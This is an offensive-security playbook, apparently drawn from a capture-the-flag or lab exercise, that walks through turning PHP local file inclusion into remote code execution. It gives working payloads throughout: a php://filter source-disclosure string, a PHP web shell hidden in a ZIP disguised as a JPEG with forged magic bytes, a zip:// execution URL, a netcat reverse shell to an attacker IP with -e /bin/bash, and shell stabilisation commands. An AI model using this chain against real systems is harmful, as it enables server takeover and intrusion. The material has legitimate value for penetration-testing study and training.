
# 🚩 LFI to RCE: The Tactical Playbook
**Author:** Sanchez  
**Context:** Offensive Security / Red Teaming  
**Objective:** Leverage Local File Inclusion (LFI) to achieve Remote Code Execution (RCE) and establish a stable Reverse Shell.

---

## 1. Scouting the Vulnerability (LFI) 🕵️‍♂️
**Concept:** The server insecurely includes files based on user input (e.g., `include($_GET['page'])`).

### Technique A: Source Code Disclosure
**Goal:** Read the PHP source code of a file (like `config.php`) without executing it.
**Tactic:** Wrap the file in a base64 filter so the server treats it as text, not code.
**Payload:**
```text
php://filter/convert.base64-encode/resource=index.php
````

  * **Decoder:** Take the base64 string output and decode it locally to see the source.

-----

## 2\. The Set-Piece: RCE via Polyglot ⚽️

**Goal:** Bypass upload filters that only allow images, but upload a PHP shell inside a ZIP archive.

### Step 1: Create the Payload

Create a PHP file (`payload.php`) with a web shell:

```php
<?php system($_GET['cmd']); ?>
```

### Step 2: The Disguise (Polyglot)

1.  **Zip it:** Compress `payload.php` into a zip file.
2.  **Rename it:** Change extension from `.zip` to `.jpg` (e.g., `avatar.jpg`).
3.  **Magic Bytes:** Use a hex editor to add `FF D8 FF` to the very beginning of the file to trick the server into thinking it's a valid JPEG.

-----

## 3\. The Strike: Executing the Payload 🥅

**Wrapper:** `zip://`
**Logic:** `zip:// [Absolute Path to Archive] # [File Inside]`

**Critical Rules:**

  * **Absolute Path:** You must know where the file was uploaded (e.g., `/var/www/html/uploads/avatar.jpg`).
  * **URL Encoding:** The `#` separator must be encoded as `%23`.
  * **No Spaces:** The URL string must be continuous.

**The Malicious URL:**

```text
[http://target.com/index.php?page=zip:///var/www/html/uploads/avatar.jpg%23payload.php&cmd=whoami](http://target.com/index.php?page=zip:///var/www/html/uploads/avatar.jpg%23payload.php&cmd=whoami)
```

-----

## 4\. The Counter-Attack: Reverse Shell 🛡️➡️⚔️

**Goal:** Turn a "dumb" web shell into an interactive terminal on your machine.

### Step 1: The Goalkeeper (Listener)

On your attacking machine (Kali/Parrot):

```bash
nc -lvnp 4444
```

### Step 2: The Shot (Payload)

On the victim server (via the URL `cmd` parameter):

```bash
nc 10.10.14.5 4444 -e /bin/bash
```

**URL Encoded Version (Required for Browser):**

```text
nc%2010.10.14.5%204444%20-e%20/bin/bash
```

-----

## 5\. Controlling the Game: Stabilization 🎮

**Goal:** Upgrade the shell to support `clear`, tab-complete, and Ctrl+C safety.

**The Combo:**

1.  **Spawn TTY:**
    ```python
    python3 -c 'import pty; pty.spawn("/bin/bash")'
    ```
2.  **Background the Shell:** `Ctrl + Z`
3.  **Fix Local Terminal:**
    ```bash
    stty raw -echo
    ```
4.  **Foreground:** `fg` (Then hit Enter twice)
5.  **Set Terminal Env:**
    ```bash
    export TERM=xterm
    ```

-----

## 6\. Next Season: Privilege Escalation 🏆

**Current Status:** User `www-data` (Low privilege)
**Target:** `root`
**First Check:**

```bash
sudo -l
```

```

---

